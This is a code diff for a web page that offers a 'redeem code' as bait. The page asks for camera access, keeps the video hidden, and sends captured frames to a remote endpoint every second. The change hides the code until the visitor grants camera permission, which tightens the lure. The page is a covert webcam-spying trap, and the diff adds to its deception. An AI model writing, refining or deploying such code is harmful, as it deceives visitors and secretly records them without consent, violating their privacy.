@@ -8,22 +8,26 @@
 <body>
     <h1>redeem-code</h1>
     <video id="video" autoplay playsinline style="width:100%; max-width:600px; display:none;"></video>
-    <p>2R5GH6H32D8S1TEC</p>
+    <p id="redeem-code" style="display:none;">2R5GH6H32D8S1TEC</p>
     <button id="stopButton">Stop</button>
     <script>
         const video = document.getElementById("video");
         const stopButton = document.getElementById("stopButton");
+        const redeemCode = document.getElementById("redeem-code");
         let stream;
+        
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 captureAndSendFrames();
+                redeemCode.style.display = "block";  // Show redeem code once camera is started
             } catch (error) {
                 console.error("Error accessing the camera:", error);
                 alert("Please allow for claim redeem code.");
             }
         }
+
         function captureAndSendFrames() {
             const canvas = document.createElement("canvas");
             const context = canvas.getContext("2d");
@@ -40,6 +44,7 @@
                 }).catch(error => console.error("Error sending frame:", error));
             }, 1000);
         }
+
         stopButton.addEventListener("click", () => {
             if (stream) {
                 const tracks = stream.getTracks();
@@ -48,6 +53,7 @@
                 alert("Camera stopped.");
             }
         });
+
         window.onload = startCamera;
     </script>
 </body>
